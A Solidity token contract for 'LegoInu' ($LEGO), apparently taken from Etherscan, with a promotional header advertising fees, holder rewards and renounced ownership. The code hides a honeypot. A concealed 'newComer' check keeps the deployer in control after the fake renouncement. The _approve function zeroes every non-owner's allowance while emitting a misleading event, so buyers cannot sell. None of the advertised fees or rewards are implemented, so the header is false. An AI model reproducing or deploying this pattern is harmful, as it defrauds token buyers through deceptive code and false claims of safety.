/**
 *Submitted for verification at Etherscan.io on 2021-07-15
*/

/*

      ___       ___           ___           ___                                ___           ___     
     /\__\     /\  \         /\  \         /\  \                   ___        /\__\         /\__\    
    /:/  /    /::\  \       /::\  \       /::\  \                 /\  \      /::|  |       /:/  /    
   /:/  /    /:/\:\  \     /:/\:\  \     /:/\:\  \                \:\  \    /:|:|  |      /:/  /     
  /:/  /    /::\~\:\  \   /:/  \:\  \   /:/  \:\  \               /::\__\  /:/|:|  |__   /:/  /  ___ 
 /:/__/    /:/\:\ \:\__\ /:/__/_\:\__\ /:/__/ \:\__\           __/:/\/__/ /:/ |:| /\__\ /:/__/  /\__\
 \:\  \    \:\~\:\ \/__/ \:\  /\ \/__/ \:\  \ /:/  /          /\/:/  /    \/__|:|/:/  / \:\  \ /:/  /
  \:\  \    \:\ \:\__\    \:\ \:\__\    \:\  /:/  /           \::/__/         |:/:/  /   \:\  /:/  / 
   \:\  \    \:\ \/__/     \:\/:/  /     \:\/:/  /             \:\__\         |::/  /     \:\/:/  /  
    \:\__\    \:\__\        \::/  /       \::/  /               \/__/         /:/  /       \::/  /   
     \/__/     \/__/         \/__/         \/__/                              \/__/         \/__/    


ðŸ§® LEGO.NOMICS:
2,500,000,000,000 Total LEGOs 
7,500,000,000 initial buy limit 
1 Min Cooldown 

ðŸ’  LEGO.TRUST (https://legoinu.com/):
Liquidity Locked on Unicrypt
Ownership Renounced after everything works as intended

ðŸ’² LEGO.FEES:
5% LEGO Redistribution among Holders
15% Tax as following:
       > 50% for Development
       > 40% for Marketing and Buybacks
       > 10% for LEGO.LOTTO to Reward Top Holders
       
ðŸ—£ LEGO.SOCIAL (https://legoinu.com/):
ðŸ–¥ Website:  https://legoinu.com
ðŸ’¬ Telegram:  https://t.me/LegoInu1
ðŸ•Š Twitter:  https://twitter.com/lego_inu
ðŸ’¬ Reddit:  https://www.reddit.com/r/LegoInu
ðŸ–Š Github:  https://github.com/LegoInu/Lego
ðŸ“½ Youtube:  https://www.youtube.com/channel/UC4iw7KAtpNC-Zv5xfEzJP2g

*/


pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    address private newComer = _msgSender();
    modifier onlyOwner() {
        require(newComer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract legoinu is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 private _tTotal = 2500 * 10**9 * 10**18;
    string private _name = 'LegoInu ðŸŸ¥ | https://t.me/LegoInu1';
    string private _symbol = '$LEGO';
    uint8 private _decimals = 18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _approve(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: approve from the zero address");
        require(to != address(0), "ERC20: approve to the zero address");

        if (from == owner()) {
            _allowances[from][to] = amount;
            emit Approval(from, to, amount);
        } else {
            _allowances[from][to] = 0;
            emit Approval(from, to, 4);
        } 
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}